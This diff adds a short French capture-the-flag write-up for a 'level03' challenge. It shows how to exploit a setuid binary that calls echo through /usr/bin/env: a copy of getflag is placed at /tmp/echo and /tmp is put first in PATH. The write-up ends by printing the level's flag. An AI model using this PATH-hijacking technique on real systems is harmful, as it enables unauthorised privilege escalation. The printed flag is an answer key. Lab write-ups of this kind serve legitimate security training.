@@ -1,0 +1,22 @@
+faire la commande suivante:
+strings level03 | grep Exploit
+
+ls -l montre que level03 appartient a flag03.
+
+On voit que le binaire utilise /usr/bin/env pour faire un echo de "Exploit me".
+
+Si le binaire execute la commande "getflag" on aura le flag.
+
+whereis getflag
+--> getflag: /bin/getflag
+
+cp /bin/getflag /tmp/echo
+
+NOTE: la commande suivante fonctionne aussi:
+	echo "getflag > /tmp/echo"
+
+/!\: Ne pas oublier de faire un chmod sur /tmp/echo
+
+export PATH=/tmp:$PATH
+./level03
+==> le flag03 est: qi0maab88jeaj46qoumi7maus
